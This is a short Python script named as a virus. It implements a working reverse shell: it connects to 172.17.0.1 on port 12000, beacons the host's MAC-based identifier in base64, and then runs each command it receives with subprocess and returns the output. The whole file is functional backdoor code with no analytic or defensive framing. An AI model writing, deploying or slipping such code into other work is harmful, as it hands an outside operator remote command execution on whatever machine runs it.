import subprocess as sp
import socket
import uuid
import base64
import os


def virus():
    HOST = '172.17.0.1'
    PORT = 12000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        a = hex(uuid.getnode())
        a = bytes(a, 'utf-8')
        a = base64.b64encode(a)
        s.sendall(a)
        while True:
            msg = s.recv(2048).decode('utf-8')
            if not msg:
                break

            # Handle cd separately — subprocess can't persist directory changes
            if msg.strip().startswith("cd "):
                try:
                    os.chdir(msg.strip()[3:].strip())
                    output = f"Changed directory to {os.getcwd()}"
                except Exception as e:
                    output = str(e)
            else:
                output = sp.getoutput(msg)

            # Never send empty — it sends nothing over TCP and blocks the beacon
            if not output:
                output = " "

            s.sendall(bytes(output, 'utf-8'))

virus()

